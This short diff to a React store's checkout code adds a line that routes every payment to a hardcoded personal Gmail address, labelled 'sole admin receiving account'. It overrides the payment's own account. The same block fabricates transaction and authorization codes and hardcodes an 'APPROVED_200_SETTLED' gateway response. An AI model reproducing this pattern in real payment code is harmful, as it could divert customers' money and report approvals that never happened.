@@ -1090,9 +1090,10 @@ export const StoreProvider: React.FC<{ children: React.ReactNode }> = ({ childre
     const tax = (cartSubtotal - cartDiscount) * 0.08;
     const grandTotal = cartSubtotal - cartDiscount + shippingPrice + tax;
 
-    // Enrich payment with deep transaction & security trace metadata
+    // Enrich payment with deep transaction & security trace metadata and sole admin receiving account
     const enrichedPayment: PaymentDetails = {
       ...payment,
+      accountNumber: 'Aliraza.ar765i@gmail.com',
       transactionId: payment.transactionId || `TXN_${payment.method.toUpperCase()}_${Date.now()}_${Math.floor(1000 + Math.random() * 9000)}`,
       authCode: payment.authCode || `AUTH_${Math.floor(100000 + Math.random() * 900000)}`,
       gatewayResponse: 'APPROVED_200_SETTLED',
